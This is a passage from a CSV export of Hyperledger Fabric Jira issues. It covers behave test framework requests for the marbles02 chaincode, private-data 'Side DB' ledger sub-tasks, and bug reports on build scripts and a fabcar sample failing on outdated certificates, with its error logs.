 ",,Nishi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"24/Jun/17 4:23 AM;Nishi;marble03_error.feature;https://jira.hyperledger.org/secure/attachment/11371/marble03_error.feature",,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy5jj:",,,,,,Sprint 19 - Quality,,,,,,,,,,,,,,,,,Nishi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
behave test fmwk: capturing output from chaincode API that returns an array of results,FAB-4970,18624,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,latitiah,Nishi,Nishi,24/Jun/17 4:31 AM,30/Jul/19 11:42 AM,28/Oct/23 3:00 AM,30/Jul/19 11:42 AM,,,,,,fabric-quality,,,,,,0,,,,,,,"Could we have the ability to receive more than 1 set of items in result set, like the API we have in marbles02 chaincode:
{code:java}
getHistoryForMarble
getMarblesByRange{code}
 

Please find attached feature file that was used in testing",,ChristopherFerris,latitiah,mastersingh24,Nishi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"24/Jun/17 4:31 AM;Nishi;marbles03_arrayOfResults.feature;https://jira.hyperledger.org/secure/attachment/11372/marbles03_arrayOfResults.feature",,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy5jr:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,ChristopherFerris,latitiah,mastersingh24,Nishi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"27/Jun/17 6:58 AM;latitiah;When performing the following to obtain the Marble history:
{code}
When a user queries on the chaincode named ""mycc"" with args [""getHistoryForMarble"",""marble1""]
And I wait ""10"" seconds
{code}
I receive the following output:
{code}
[{""TxId"":""114f15b75eb6ead73125bbcc8a40575d68cff4fb3d3334276735b0e1dde98bde"", ""Value"":{""docType"":""marble"",""name"":""marble1"",""color"":""red"",""size"":35,""owner"":""tom""}, ""Timestamp"":""2017-06-26 21:28:33.733410705 +0000 UTC"", ""IsDelete"":""false""}]
{code}

When performing the following to obtain the marble range:
{code}
When a user queries on the chaincode named ""mycc"" with args [""getMarblesByRange"",""marble1"", ""marble201""]
And I wait ""10"" seconds
{code}
I receive the following output:
{code}
 [{""Key"":""marble1"", ""Record"":{""docType"":""marble"",""name"":""marble1"",""color"":""red"",""size"":35,""owner"":""tom""}}]
{code}

Since you are performing ""get"" calls, these should be queries and not invokes. I am also modifying the framwork to allow for verification of a subset of the output. The following scenario works with this added code change.
{code}
Scenario: FAB-XXXX: Test marbles chaincode
  Given I have a bootstrapped fabric network of type kafka
  And I wait ""60"" seconds
  When a user deploys chaincode at path ""github.com/hyperledger/fabric/examples/chaincode/go/marbles02"" with [""""] with name ""mycc""
  And I wait ""5"" seconds
  When a user invokes on the chaincode named ""mycc"" with args [""initMarble"",""marble1"",""red"",""35"",""tom""]
  And I wait ""10"" seconds
  When a user queries on the chaincode named ""mycc"" with args [""readMarble"",""marble1""]
  Then a user receives successful response of {""docType"":""marble"",""name"":""marble1"",""color"":""red"",""size"":35,""owner"":""tom""}
  When a user invokes on the chaincode named ""mycc"" with args [""initMarble"",""marble201"",""blue"",""6"",""ram""]
  And I wait ""10"" seconds
# Test getHistoryForMarble
  When a user queries on the chaincode named ""mycc"" with args [""getHistoryForMarble"",""marble1""]
  And I wait ""10"" seconds
  Then a user receives a response containing {""docType"":""marble"",""name"":""marble1"",""color"":""red"",""size"":35,""owner"":""tom""}, ""Timestamp"" from ""peer0.org1.example.com""
# Test getMarblesByRange
  When a user queries on the chaincode named ""mycc"" with args [""getMarblesByRange"",""marble1"", ""marble201""]
  And I wait ""10"" seconds
  Then a user receives successful response of [{""Key"":""marble1"", ""Record"":{""docType"":""marble"",""name"":""marble1"",""color"":""red"",""size"":35,""owner"":""tom""}}] from ""peer0.org1.example.com""
{code};;;","29/Jun/17 1:18 AM;ChristopherFerris;I don't consider this a defect as much as it is a requested improvement;;;","30/Jul/19 11:42 AM;mastersingh24;Open 1 year or more with no activity ... time to cleanup;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
behave test fmwk: could we check for existence of sub_elements in return data set,FAB-4971,18625,19362,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,latitiah,Nishi,Nishi,24/Jun/17 4:34 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,15/Aug/17 12:00 AM,,,,,,fabric-quality,,,,,,0,quality,,,,,,"Like being able to verify for an element from returned json structue:

Like for instance marble has dataset like: \{""name"", ""color"", ""size"", ""owner""}:\{""marble1"",""red"",""35"",""tom""} when using marbles02 chaincode.

If i would like verify say owner of marble1, then may be I would have the following in my feature file
{code:java}
When a user invokes on the chaincode named ""mycc"" with args [""initMarble"",""marble1"",""red"",""35"",""tom""]
And I wait ""10"" seconds
When a user queries on the chaincode named ""mycc"" with args [""readMarble"",""marble1"", ""owner""]
Then a user receives expected response of {""docType"":""marble"",""name"":""marble1"",""owner"":""tom""}{code}
 ",,latitiah,Nishi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy5jz:",,,,,,Sprint 19 - Quality,,,,,2.0,,,,,,,,,,,,latitiah,Nishi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,release-2.4,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,true,"07/Jul/17 12:02 AM;latitiah;https://gerrit.hyperledger.org/r/11387;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Side DB - Ledger interfaces,FAB-4972,18626,18787,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,denyeart,denyeart,24/Jun/17 4:55 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,08/Aug/17 6:05 AM,,,,,,,,,,,,0,,,,,,,Define/Enhance interfaces for implementing/enhancing side db functionality.,,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy5k7:",,,,,,,,,,,,,,,,,,,,,,,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Side DB - Ledger proto messages,FAB-4974,18628,18787,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,manish-sethi,manish-sethi,manish-sethi,24/Jun/17 5:14 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,08/Aug/17 6:03 AM,,,,,,,,,,,,0,,,,,,,Define/Enhance proto messages for capturing private rwset and hashed rwset,,manish-sethi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy5kf:",,,,,,,,,,,,,,,,,,,,,,,manish-sethi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Side DB - Ledger transient store,FAB-4975,18629,18787,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Senthil1,manish-sethi,manish-sethi,24/Jun/17 5:15 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,06/Aug/17 7:39 PM,,,,,,,,,,,,0,,,,,,,Implement transient store for keeping the private read-write set. The main purpose of transient store is to preserve the private read-write set temporarily - so that the private data is available to the selective committers during the commit phase.,,manish-sethi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy5kn:",,,,,,,,,,,,,,,,,,,,,,,manish-sethi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Side DB - Ledger private rwSet store,FAB-4976,18630,18787,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,manish-sethi,manish-sethi,manish-sethi,24/Jun/17 5:16 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,16/Aug/17 2:27 AM,,,,,,,,,,,,0,,,,,,,Implement a store for persisting private read-write set. This similar to the block store for public read-write set.,,manish-sethi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy5kv:",,,,,,,,,,,,,,,,,,,,,,,manish-sethi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Side DB - Ledger statedb,FAB-4977,18631,18787,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,manish-sethi,manish-sethi,manish-sethi,24/Jun/17 5:17 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,08/Aug/17 6:02 AM,,,,,,,,,,,,0,,,,,,,Enhance statedb layer for persisting the private data and hashes for the private data,,manish-sethi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy5l3:",,,,,,,,,,,,,,,,,,,,,,,manish-sethi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Side DB - Ledger transaction simulation,FAB-4978,18632,18787,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,manish-sethi,manish-sethi,24/Jun/17 5:18 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,16/Aug/17 2:28 AM,,,,,,,,,,,,0,,,,,,,Enhance transaction simulation in order to capture the  private read-write set and hashed read-write set for the private data.,,manish-sethi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy5lb:",,,,,,,,,,,,,,,,,,,,,,,manish-sethi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"16/Aug/17 2:29 AM;manish-sethi;Done as part of FAB-5654;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Side DB - Ledger block validation and state change,FAB-4979,18633,18787,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,manish-sethi,manish-sethi,24/Jun/17 5:19 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,16/Aug/17 2:30 AM,,,,,,,,,,,,0,,,,,,,Enhance block validation to include the hashed read-write set and enhance the state updates to take the private read-write set in account,,manish-sethi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy5lj:",,,,,,,,,,,,,,,,,,,,,,,manish-sethi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"16/Aug/17 2:30 AM;manish-sethi;Done as part of FAB-5654;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Side DB - Ledger commit and recovery,FAB-4980,18634,18787,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,manish-sethi,manish-sethi,manish-sethi,24/Jun/17 5:20 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,03/Oct/17 5:59 PM,,,,,,,,,,,,0,,,,,,,Enhance the commit and recovery logic to include the private read-write sets,,denyeart,manish-sethi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy5lr:",,,,,,,,,,,,,,,,,,,,,,,denyeart,manish-sethi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"07/Sep/17 2:40 AM;denyeart;https://gerrit.hyperledger.org/r/#/c/13017/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
P4 - Ledger capture history of private data,FAB-4981,18635,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,manish-sethi,manish-sethi,24/Jun/17 5:21 AM,21/Jul/18 3:56 AM,28/Oct/23 3:00 AM,29/Jun/17 9:20 PM,,,,,,,,,,,,0,,,,,,,Enhance Historydb to capture the history for the private data,,manish-sethi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,FAB-5094,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy5lz:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,manish-sethi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
fix filename of binary distribution,FAB-4985,18640,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,ChristopherFerris,ChristopherFerris,24/Jun/17 7:50 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,27/Nov/17 12:30 PM,v1.0.0-rc1,,,,,fabric-build,,,,,,0,,,,,,,https://chat.hyperledger.org/channel/fabric-release?msg=YEWNH9fdLC48fqxxr,,ChristopherFerris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy5mv:",,,,,,,,,,,,,,,,,,,,,,,ChristopherFerris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"24/Jun/17 7:57 AM;ChristopherFerris;https://gerrit.hyperledger.org/r/#/c/11111/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
tools docker image reference is missing in bootstrap-1.0.0-rc1 script,FAB-4986,18641,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,rameshthoomu,rameshthoomu,rameshthoomu,24/Jun/17 8:46 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,24/Jun/17 10:27 AM,v1.0.0-rc1,,,v1.0.0,,fabric-build,,,,,,0,build-system,,,,,,"tools docker image reference is missing in bootstrap-1.0.0-rc1 script.

https://github.com/hyperledger/fabric/blob/master/scripts/bootstrap-1.0.0-rc1.sh#L15

 

 ",,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzx25z:",,,,,,,,,,,,,,,,,,,,,,,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"24/Jun/17 10:27 AM;rameshthoomu;patch has been merged;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
fabric-sample fabcar is broken due to old certs,FAB-4988,18644,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Ratnakar,Ratnakar,Ratnakar,24/Jun/17 1:35 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,24/Jun/17 11:28 PM,v1.0.0-rc1,,,v1.0.0-rc1,,fabric-samples,,,,,,0,,,,,,,"Followed the instructions from this [link|http://hyperledger-fabric.readthedocs.io/en/latest/write_first_app.html#getting-a-test-network]  

After starting the network using the script *startFabric.sh* , channel creation fails with the following error. 
{panel}
2017-06-24 04:25:35.116 UTC [main] main -> ERRO 005 Cannot run peer because error when setting up MSP from directory /etc/hyperledger/msp/users/Admin@org1.example.com: err admin 0 is invalid, validation error Could not obtain certification chain, err A CA certificate cannot be used directly by this MSP
{panel}
_app is using slightly old certs causing this issue._

 

*+full logs here:+*
{code:java}
fabric-samples/fabcar$ ./startFabric.sh 

Creating couchdb
Creating orderer.example.com
Creating peer0.org1.example.com
Creating cli
2017-06-24 04:25:35.098 UTC [msp] getMspConfig -> WARN 001 Intermediate certs folder not found at [/etc/hyperledger/msp/users/Admin@org1.example.com/intermediatecerts]. Skipping. [stat /etc/hyperledger/msp/users/Admin@org1.example.com/intermediatecerts: no such file or directory]
2017-06-24 04:25:35.098 UTC [msp] getMspConfig -> WARN 002 TLS CA certs folder not found at [/etc/hyperledger/msp/users/Admin@org1.example.com/tlsintermediatecerts]. Skipping and ignoring TLS intermediate CA folder. [stat /etc/hyperledger/msp/users/Admin@org1.example.com/tlscacerts: no such file or directory]
2017-06-24 04:25:35.098 UTC [msp] getMspConfig -> WARN 003 crls folder not found at [/etc/hyperledger/msp/users/Admin@org1.example.com/crls]. Skipping. [stat /etc/hyperledger/msp/users/Admin@org1.example.com/crls: no such file or directory]
2017-06-24 04:25:35.098 UTC [msp] getMspConfig -> INFO 004 MSP configuration file not found at [/etc/hyperledger/msp/users/Admin@org1.example.com/config.yaml]: [stat /etc/hyperledger/msp/users/Admin@org1.example.com/config.yaml: no such file or directory]
2017-06-24 04:25:35.116 UTC [main] main -> ERRO 005 Cannot run peer because error when setting up MSP from directory /etc/hyperledger/msp/users/Admin@org1.example.com: err admin 0 is invalid, validation error Could not obtain certification chain, err A CA certificate cannot be used directly by this MSP
2017-06-24 04:25:35.228 UTC [msp] getMspConfig -> WARN 001 Intermediate certs folder not found at [/etc/hyperledger/msp/users/Admin@org1.example.com/intermediatecerts]. Skipping. [stat /etc/hyperledger/msp/users/Admin@org1.example.com/intermediatecerts: no such file or directory]
2017-06-24 04:25:35.228 UTC [msp] getMspConfig -> WARN 002 TLS CA certs folder not found at [/etc/hyperledger/msp/users/Admin@org1.example.com/tlsintermediatecerts]. Skipping and ignoring TLS intermediate CA folder. [stat /etc/hyperledger/msp/users/Admin@org1.example.com/tlscacerts: no such file or directory]
2017-06-24 04:25:35.228 UTC [msp] getMspConfig -> WARN 003 crls folder not found at [/etc/hyperledger/msp/users/Admin@org1.example.com/crls]. Skipping. [stat /etc/hyperledger/msp/users/Admin@org1.example.com/crls: no such file or directory]
2017-06-24 04:25:35.228 UTC [msp] getMspConfig -> INFO 004 MSP configuration file not found at [/etc/hyperledger/msp/users/Admin@org1.example.com/config.yaml]: [stat /etc/hyperledger/msp/users/Admin@org1.example.com/config.yaml: no such file or directory]
2017-06-24 04:25:35.247 UTC [main] main -> ERRO 005 Cannot run peer because error when setting up MSP from directory /etc/hyperledger/msp/users/Admin@org1.example.com: err admin 0 is invalid, validation error Could not obtain certification chain, err A CA certificate cannot be used directly by this MSP
2017-06-24 04:25:35.389 UTC [msp] getMspConfig -> WARN 001 Intermediate certs folder not found at [/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/users/Admin@org1.example.com/intermediatecerts]. Skipping. [stat /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/users/Admin@org1.example.com/intermediatecerts: no such file or directory]
2017-06-24 04:25:35.389 UTC [msp] getMspConfig -> WARN 002 TLS CA certs folder not found at [/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/users/Admin@org1.example.com/tlsintermediatecerts]. Skipping and ignoring TLS intermediate CA folder. [stat /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/users/Admin@org1.example.com/tlscacerts: no such file or directory]
2017-06-24 04:25:35.389 UTC [msp] getMspConfig -> WARN 003 crls folder not found at [/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/users/Admin@org1.example.com/crls]. Skipping. [stat /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/users/Admin@org1.example.com/crls: no such file or directory]
2017-06-24 04:25:35.389 UTC [msp] getMspConfig -> INFO 004 MSP configuration file not found at [/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/users/Admin@org1.example.com/config.yaml]: [stat /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/users/Admin@org1.example.com/config.yaml: no such file or directory]
2017-06-24 04:25:35.409 UTC [main] main -> ERRO 005 Cannot run peer because error when setting up MSP from directory /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/users/Admin@org1.example.com: err admin 0 is invalid, validation error Could not obtain certification chain, err A CA certificate cannot be used directly by this MSP
2017-06-24 04:25:35.539 UTC [msp] getMspConfig -> WARN 001 Intermediate certs folder not found at [/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/users/Admin@org1.example.com/intermediatecerts]. Skipping. [stat /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/users/Admin@org1.example.com/intermediatecerts: no such file or directory]
2017-06-24 04:25:35.539 UTC [msp] getMspConfig -> WARN 002 TLS CA certs folder not found at [/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/users/Admin@org1.example.com/tlsintermediatecerts]. Skipping and ignoring TLS intermediate CA folder. [stat /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/users/Admin@org1.example.com/tlscacerts: no such file or directory]
2017-06-24 04:25:35.539 UTC [msp] getMspConfig -> WARN 003 crls folder not found at [/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/users/Admin@org1.example.com/crls]. Skipping. [stat /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/users/Admin@org1.example.com/crls: no such file or directory]
2017-06-24 04:25:35.539 UTC [msp] getMspConfig -> INFO 004 MSP configuration file not found at [/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/users/Admin@org1.example.com/config.yaml]: [stat /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/users/Admin@org1.example.com/config.yaml: no such file or directory]
2017-06-24 04:25:35.559 UTC [main] main -> ERRO 005 Cannot run peer because error when setting up MSP from directory /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/users/Admin@org1.example.com: err admin 0 is invalid, validation error Could not obtain certification chain, err A CA certificate cannot be used directly by this MSP
2017-06-24 04:25:45.716 UTC [msp] getMspConfig -> WARN 001 Intermediate certs folder not found at [/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/users/Admin@org1.example.com/intermediatecerts]. Skipping. [stat /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/users/Admin@org1.example.com/intermediatecerts: no such file or directory]
2017-06-24 04:25:45.716 UTC [msp] getMspConfig -> WARN 002 TLS CA certs folder not found at [/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/users/Admin@org1.example.com/tlsintermediatecerts]. Skipping and ignoring TLS intermediate CA folder. [stat /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/users/Admin@org1.example.com/tlscacerts: no such file or directory]
2017-06-24 04:25:45.716 UTC [msp] getMspConfig -> WARN 003 crls folder not found at [/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/users/Admin@org1.example.com/crls]. Skipping. [stat /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/users/Admin@org1.example.com/crls: no such file or directory]
2017-06-24 04:25:45.716 UTC [msp] getMspConfig -> INFO 004 MSP configuration file not found at [/opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/users/Admin@org1.example.com/config.yaml]: [stat /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/users/Admin@org1.example.com/config.yaml: no such file or directory]
